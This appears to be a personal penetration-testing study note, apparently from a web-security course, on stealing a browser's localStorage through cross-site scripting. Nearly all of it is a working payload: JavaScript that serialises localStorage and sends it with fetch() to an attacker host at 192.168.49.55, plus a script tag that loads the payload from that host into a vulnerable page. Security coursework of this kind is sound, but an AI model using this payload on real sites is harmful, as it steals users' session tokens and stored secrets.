---
tags:
  - xss
---
# Stealing local storage XSS

How use external payload see here: [[2023042721181010 XSS external JS payload]]#web200 #XSS 
## Payload
```js
ip = '192.168.49.55';
let data = JSON.stringify(localStorage);
let encodedData = encodeURIComponent(data);
fetch("http://" + ip + "/localStorage?data=" + encodedData);
```

## Inject payload 
```html
<script src='http://192.168.49.55/xss.js'></script>
```

## References
1. web200.Cross-Site Scripting Exploitation and Case Study.Stealing Local secrets